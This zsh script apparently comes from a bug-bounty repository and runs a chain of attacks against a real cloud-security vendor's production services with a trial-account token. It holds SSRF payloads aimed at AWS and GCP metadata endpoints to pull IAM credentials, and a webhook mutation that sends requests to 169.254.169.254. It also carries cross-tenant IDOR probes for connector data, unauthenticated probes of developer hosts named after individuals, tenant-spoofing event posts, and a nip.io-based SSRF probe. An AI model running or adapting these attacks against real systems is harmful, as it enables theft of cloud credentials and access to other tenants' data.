#!/usr/bin/env zsh
# Phase 4 — Trial account attacks: Webhook SSRF + GraphQL IDOR
#
# REQUIRES: Wiz trial account registered at app.wiz.io
# Set WIZ_EMAIL and WIZ_JWT before running, or run login interactively.
#
# WHAT THIS TESTS:
#   Chain 3: Webhook SSRF → internal Grafana → cloud credentials
#   Chain 4: GraphQL cross-tenant IDOR (requires 2 accounts)
#
# Usage:
#   export WIZ_JWT="eyJ..."   # paste JWT from browser DevTools after login
#   zsh ~/bug-bounty-hunting-/scripts/phase4-trial-account-wiz.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

RESULTS=~/bug-bounty-hunting-/results/wiz.io/04-trial
mkdir -p "$RESULTS"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$RESULTS/trial-hunt.log"; }
sep() { echo "================================================================" | tee -a "$RESULTS/trial-hunt.log"; }

if [ -z "$WIZ_JWT" ]; then
  log "ERROR: WIZ_JWT not set."
  log "Steps to get JWT:"
  log "  1. Login at https://app.wiz.io"
  log "  2. Open DevTools → Network → any /graphql request"
  log "  3. Copy Authorization header value (after 'Bearer ')"
  log "  4. export WIZ_JWT='your-jwt-here'"
  log "  5. Re-run this script"
  exit 1
fi

log "=== Phase 4 trial account attacks — wiz.io ==="
sep

GRAPHQL="https://api.us1.app.wiz.io/graphql"
AUTH="Authorization: Bearer ${WIZ_JWT}"

gql_query() {
  local query="$1"
  curl -sk --connect-timeout 15 --max-time 30 \
    -X POST "$GRAPHQL" \
    -H "$AUTH" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"${query}\"}" 2>/dev/null
}

# ----------------------------------------------------------------
# A. JWT validation and tenant extraction
# ----------------------------------------------------------------
log "A. JWT validation + tenant info"

{
  echo "=== Decode JWT payload (base64) ==="
  echo "$WIZ_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20

  echo ""
  echo "=== whoami query ==="
  gql_query 'query { me { id name email } }' | python3 -m json.tool 2>/dev/null

  echo ""
  echo "=== tenant info ==="
  gql_query 'query { tenant { id name tier } }' | python3 -m json.tool 2>/dev/null
} | tee "$RESULTS/jwt-tenant-info.txt"
sep

# ----------------------------------------------------------------
# B. GraphQL introspection (full schema)
# ----------------------------------------------------------------
log "B. GraphQL full schema introspection"

curl -sk --connect-timeout 15 --max-time 60 \
  -X POST "$GRAPHQL" \
  -H "$AUTH" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } mutationType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"
  }' 2>/dev/null | python3 -m json.tool 2>/dev/null \
  | tee "$RESULTS/graphql-schema.txt"
log "Full schema → $RESULTS/graphql-schema.txt"

# Extract all query names for IDOR analysis
echo "" | tee -a "$RESULTS/graphql-schema.txt"
echo "=== Query names ==="
python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    fields = d['data']['__schema']['queryType']['fields']
    for f in sorted(fields, key=lambda x: x['name']):
        args = [a['name'] for a in f.get('args', [])]
        print(f\"{f['name']}({', '.join(args)})\")
except: pass
" < "$RESULTS/graphql-schema.txt" | tee "$RESULTS/graphql-query-list.txt"
log "Query list → $RESULTS/graphql-query-list.txt"
sep

# ----------------------------------------------------------------
# C. IDOR candidates — queries with id parameters
# ----------------------------------------------------------------
log "C. IDOR probe — queries accepting id parameter"

MY_TENANT=$(gql_query 'query { tenant { id } }' 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['data']['tenant']['id'])" 2>/dev/null)
log "My tenant ID: $MY_TENANT"

{
  echo "MY_TENANT_ID: $MY_TENANT"
  echo ""

  echo "=== project query (cross-tenant IDOR target) ==="
  gql_query 'query { projects(first: 3) { nodes { id name cloudAccountCount } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== connector list (cloud creds!) ==="
  gql_query 'query { connectors(first: 3) { nodes { id name type status } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== issues list ==="
  gql_query 'query { issues(first: 3) { nodes { id title severity } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== cloudResources ==="
  gql_query 'query { cloudResources(first: 3) { nodes { id name type } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== node() global ID lookup ==="
  gql_query 'query { node(id: "test-id-12345") { id __typename } }' \
    | python3 -m json.tool 2>/dev/null | head -20
} | tee "$RESULTS/idor-baseline.txt"
log "IDOR baseline → $RESULTS/idor-baseline.txt"

# Extract my IDs for cross-tenant test
MY_PROJECT=$(python3 -c "
import json, sys
try:
    d = open('$RESULTS/idor-baseline.txt').read()
    import re
    ids = re.findall(r'\"id\": \"([a-f0-9-]{36})\"', d)
    print(ids[0] if ids else '')
except: pass
" 2>/dev/null)
log "Sample project ID: $MY_PROJECT"
sep

# ----------------------------------------------------------------
# D. Webhook SSRF (P0 — highest payout chain)
# ----------------------------------------------------------------
log "D. Webhook SSRF probe"
log "  Manual step needed: create a webhook via portal UI"
log "  Settings → Integrations → Custom Webhooks → Add"
log "  Then trigger an alert to activate the webhook"

{
  echo "=== SSRF PAYLOAD LIST ==="
  echo "Try each URL as webhook destination in portal UI:"
  echo ""
  echo "1. AWS IMDSv1 (direct):"
  echo "   http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  echo ""
  echo "2. AWS IMDSv1 role name then creds:"
  echo "   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
  echo ""
  echo "3. GCP metadata:"
  echo "   http://metadata.google.internal/computeMetadata/v1/?recursive=true"
  echo "   (header required: Metadata-Flavor: Google — check if webhook svc adds it)"
  echo ""
  echo "4. Internal Grafana health (no auth):"
  echo "   http://us1.grafana.wiz.io/api/health"
  echo ""
  echo "5. Internal Grafana datasources (admin access = cloud creds):"
  echo "   http://us1.grafana.wiz.io/api/datasources"
  echo ""
  echo "6. Localhost probe:"
  echo "   http://127.0.0.1:3000/api/health"
  echo "   http://127.0.0.1:8080/"
  echo ""
  echo "7. OOB detection (use your interactsh domain):"
  echo "   http://INTERACTSH_DOMAIN/ssrf-test"

  echo ""
  echo "=== Check if webhook endpoint accepts localhost/RFC1918 ==="
  # These are GraphQL mutations that create webhook configs — check schema
  gql_query 'query { __type(name: "CreateWebhookInput") { fields { name type { name } description } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== Try GraphQL webhook create directly ==="
  gql_query 'mutation { createWebhook(input: { name: "ssrf-test", url: "http://169.254.169.254/latest/meta-data/", method: POST }) { webhook { id url } } }' \
    | python3 -m json.tool 2>/dev/null | head -20
} | tee "$RESULTS/webhook-ssrf-guide.txt"
log "Webhook SSRF guide → $RESULTS/webhook-ssrf-guide.txt"
sep

# ----------------------------------------------------------------
# E. RDE webhooks — developer environments (no auth needed maybe)
# ----------------------------------------------------------------
log "E. RDE developer webhook endpoints (may have relaxed auth)"

{
  for host in \
    webhooks.guy.goldenberg.rde.wiz.io \
    webhooks.roey.dror-us.rde.wiz.io \
    webhooks.roy5.rde.wiz.io \
    webhooks.cfir.rde.wiz.io \
    webhooks.on-demand-1.rde.wiz.io \
    webhooks.bootstrap-rde-001.rde.wiz.io; do
    echo "=== $host ==="
    headers=$(curl -sI --connect-timeout 8 "https://${host}/" 2>/dev/null | head -15)
    body=$(curl -sk --connect-timeout 8 "https://${host}/" 2>/dev/null | head -c 400)
    echo "HEADERS: $headers"
    echo "BODY: $body"
    # Try unauthenticated GraphQL on RDE
    gql_resp=$(curl -sk --connect-timeout 8 -X POST "https://${host}/graphql" \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __typename }"}' 2>/dev/null | head -c 200)
    echo "GRAPHQL (no auth): $gql_resp"
    echo ""
  done
} | tee "$RESULTS/rde-webhook-detailed.txt"
log "RDE detailed probe → $RESULTS/rde-webhook-detailed.txt"
sep

# ----------------------------------------------------------------
# F. Cross-tenant IDOR — requires 2 accounts
# ----------------------------------------------------------------
log "F. Cross-tenant IDOR note"
cat << 'EOF' | tee "$RESULTS/cross-tenant-guide.txt"
=== CROSS-TENANT IDOR GUIDE ===

To test cross-tenant IDOR (Chain 4):

1. Register SECOND Wiz trial account (different email/Google account)
2. Extract IDs from second account: project IDs, connector IDs, issue IDs
3. Use FIRST account's JWT to query those IDs

Test pattern:
  From account B, get project ID: proj-B-12345
  From account A, query:
    { project(id: "proj-B-12345") { name cloudAccountCount connectors { nodes { id } } } }

If account A can see account B's project → Critical cross-tenant IDOR

Key queries to test:
  project(id: X)
  connector(id: X)  ← highest value (= cloud credentials)
  issue(id: X)
  cloudResource(id: X)
  node(id: X)       ← Relay global ID, most dangerous

EOF
sep

# ----------------------------------------------------------------
# G. Chain 11 — AI Remediation cross-tenant PR injection (NEW — from WizCLI binary)
# ----------------------------------------------------------------
log "G. Chain 11 — AI Remediation cross-tenant PR injection"
log "  Source: WizCLI binary embedded proto package github.com/wiz-sec/wiz/grpclib/rpc/ai"

{
  echo "=== Find AI remediation mutations in schema ==="
  gql_query '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"}' \
    | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  fields=d['data']['__schema']['mutationType']['fields']
  keywords=['remedi','action','pullrequest','pull_request','pr','vcs','ai','patch','response']
  for f in fields:
    name_lower=f['name'].lower()
    desc_lower=(f.get('description') or '').lower()
    if any(k in name_lower or k in desc_lower for k in keywords):
      args=[a['name'] for a in f.get('args',[])]
      print(f\"{f['name']}({', '.join(args)})\")
      print(f\"  desc: {f.get('description','')}\")
except Exception as e: print(f'error: {e}')
" 2>/dev/null | head -60
  echo ""

  echo "=== RequestCustomPullRequest input type schema ==="
  gql_query '{"query":"{ __type(name: \"RequestCustomPullRequestInput\") { fields { name type { name kind ofType { name kind } } description } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -30
  echo ""

  echo "=== RunResponseAction input type schema ==="
  gql_query '{"query":"{ __type(name: \"RunResponseActionInput\") { fields { name type { name kind ofType { name kind } } description } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -30
  echo ""

  echo "=== IssueRemediation input type schema ==="
  gql_query '{"query":"{ __type(name: \"IssueRemediationInput\") { fields { name type { name kind } description } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -30
  echo ""

  echo "=== VCS repository list (get repositoryId format for cross-tenant test) ==="
  gql_query '{"query":"{ vcsRepositories(first: 5) { nodes { id name url } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -30
  echo ""

  echo "=== GitHub/GitLab connectors (VCS integration IDs) ==="
  gql_query '{"query":"{ connectors(first: 10) { nodes { id name type status } } }"}' \
    | python3 -m json.tool 2>/dev/null | head -40
  echo ""

  echo "=== All mutation names containing 'remedi' or 'action' or 'pull' ==="
  gql_query '{"query":"{ __schema { mutationType { fields { name } } } }"}' \
    | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  fields=d['data']['__schema']['mutationType']['fields']
  for f in fields:
    if any(k in f['name'].lower() for k in ['remedi','action','pull','patch','vcs','ai']):
      print(f['name'])
except: pass
" 2>/dev/null | head -40

} | tee "$RESULTS/chain11-ai-remediation.txt"
log "Chain 11 results → $RESULTS/chain11-ai-remediation.txt"
sep

# ----------------------------------------------------------------
# H. Chain 9 — forensics-package.app.wiz.io cross-tenant IDOR
# ----------------------------------------------------------------
log "G. Chain 9 — forensics-package cross-tenant IDOR probe"

MY_TENANT_ID=$(python3 -c "
import json, sys
try:
    d=open('$RESULTS/jwt-tenant-info.txt').read()
    import re
    m=re.search(r'\"id\": \"([a-zA-Z0-9_-]+)\"', d)
    print(m.group(1) if m else '')
except: pass
" 2>/dev/null)

{
  echo "My tenant ID: ${MY_TENANT_ID:-UNKNOWN}"
  echo ""

  echo "=== Confirm Lambda@Edge auth pattern (browser UA required) ==="
  curl -sk --connect-timeout 10 \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124" \
    "https://prod-us52.forensics-package.app.wiz.io/" 2>/dev/null | head -c 200
  echo ""

  echo "=== Baseline: probe own tenant path ==="
  if [ -n "$MY_TENANT_ID" ]; then
    curl -sk --connect-timeout 10 \
      -H "Authorization: Bearer $WIZ_JWT" \
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124" \
      "https://prod-us52.forensics-package.app.wiz.io/packages/${MY_TENANT_ID}/" \
      -v 2>&1 | head -40
  else
    echo "SKIP: tenant ID unknown (check jwt-tenant-info.txt)"
  fi
  echo ""

  echo "=== NOTE: To test cross-tenant IDOR ==="
  echo "1. Get OTHER_TENANT_ID from second account"
  echo "2. curl -H 'Authorization: Bearer \$WIZ_JWT' \\"
  echo "   https://prod-us52.forensics-package.app.wiz.io/packages/\$OTHER_TENANT_ID/"
  echo "3. If 200 response with data → Critical cross-tenant IDOR"
} | tee "$RESULTS/chain9-forensics-idor.txt"
log "Chain 9 results → $RESULTS/chain9-forensics-idor.txt"
sep

# ----------------------------------------------------------------
# H. Chain 10 — events-ingestion tenant spoofing
# ----------------------------------------------------------------
log "H. Chain 10 — events-ingestion tenant spoofing"

{
  echo "=== Get events endpoint schema ==="
  gql_query 'query { __type(name: "IngestEventInput") { fields { name type { name kind } description } } }' \
    | python3 -m json.tool 2>/dev/null | head -30
  echo ""

  echo "=== POST own event (baseline — should 2xx) ==="
  curl -sk --connect-timeout 10 -X POST \
    "https://events-ingestion.eu21.app.wiz.io/events" \
    -H "Authorization: Bearer $WIZ_JWT" \
    -H "Content-Type: application/json" \
    -d "{\"events\":[{\"type\":\"test\",\"source\":\"bounty-hunter-test\",\"tenant_id\":\"${MY_TENANT_ID:-test}\"}]}" \
    2>/dev/null | python3 -m json.tool 2>/dev/null | head -20
  echo ""

  echo "=== NOTE: To test tenant spoofing ==="
  echo "Replace tenant_id with OTHER_TENANT_ID and check if event is attributed"
  echo "to the other tenant's dashboard or event log."
} | tee "$RESULTS/chain10-events-ingestion.txt"
log "Chain 10 results → $RESULTS/chain10-events-ingestion.txt"
sep

# ----------------------------------------------------------------
# I. Chain 7 — dynamic-dns-checker.wiz.io SSRF probe
# ----------------------------------------------------------------
log "I. Chain 7 — dynamic-dns-checker.wiz.io"

{
  echo "=== Fingerprint ==="
  curl -sI --connect-timeout 10 "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -15
  echo ""
  curl -sk --connect-timeout 10 "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -c 500
  echo ""

  echo "=== Path probe ==="
  for p in /health /api /v1 /check /dns /verify /lookup /resolve; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://dynamic-dns-checker.wiz.io${p}" 2>/dev/null)
    echo "${code}  ${p}"
  done
  echo ""

  echo "=== SSRF probe: supply metadata IP as domain to check ==="
  curl -sk --connect-timeout 10 -X POST \
    "https://dynamic-dns-checker.wiz.io/check" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $WIZ_JWT" \
    -d '{"domain":"169-254-169-254.nip.io","expected_ip":"169.254.169.254"}' \
    2>/dev/null | head -c 300
  echo ""

  curl -sk --connect-timeout 10 -X POST \
    "https://dynamic-dns-checker.wiz.io/verify" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $WIZ_JWT" \
    -d '{"hostname":"169-254-169-254.nip.io"}' \
    2>/dev/null | head -c 300
} | tee "$RESULTS/chain7-dns-checker-ssrf.txt"
log "Chain 7 results → $RESULTS/chain7-dns-checker-ssrf.txt"
sep

log "=== Phase 4 trial account hunt COMPLETE ==="
log ""
log "Results priority review:"
log "  1. $RESULTS/webhook-ssrf-guide.txt  — run the SSRF payloads via portal UI"
log "  2. $RESULTS/chain9-forensics-idor.txt — cross-tenant IDOR (needs 2nd account)"
log "  3. $RESULTS/cross-tenant-guide.txt — cross-tenant GraphQL IDOR guide"
log "  4. $RESULTS/graphql-schema.txt — schema analysis for hidden queries"
log "  5. $RESULTS/chain10-events-ingestion.txt — tenant spoofing probe"
log "  6. $RESULTS/chain7-dns-checker-ssrf.txt — DNS checker SSRF probe"
log ""
log "All results: $RESULTS/"
ls -la "$RESULTS/"
